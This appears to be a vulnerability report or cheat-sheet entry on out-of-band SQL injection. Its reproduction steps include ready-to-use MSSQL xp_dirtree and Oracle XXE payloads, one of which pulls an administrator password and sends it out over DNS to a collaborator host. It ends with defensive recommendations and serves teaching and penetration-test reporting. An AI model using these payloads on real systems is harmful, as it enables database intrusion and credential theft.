# SQL Injection - Out-of-Band (OAST) SQL Injection

**Title:** Out-of-Band SQL Injection for Data Exfiltration

**Severity:** High

**Impact:** High

**Exploitability:** Medium

**CVSS Base Score:** 7.5

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

**Vulnerability Type:** SQL Injection

**Target:** Parameters allowing stacked queries or DNS/HTTP functions

## Impact

Allows reliable confirmation and data exfiltration via DNS or HTTP callbacks to attacker-controlled servers.

## Description

When in-band or blind techniques are limited, OAST can be used to trigger external interactions from the database server.

## Steps to Reproduce

Microsoft SQL:
```
'; exec master..xp_dirtree '//collaborator.example.com/a'--
```

Data exfil:
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.collaborator.net/a"')--
```

Advanced with UNION:
```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//collaborator.example.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

## Recommendation

Restrict database outbound connections. Use parameterized queries. Monitor for unusual DNS activity.

## References

- PortSwigger SQL Injection Cheat Sheet
- OWASP SQL Injection Prevention Cheat Sheet
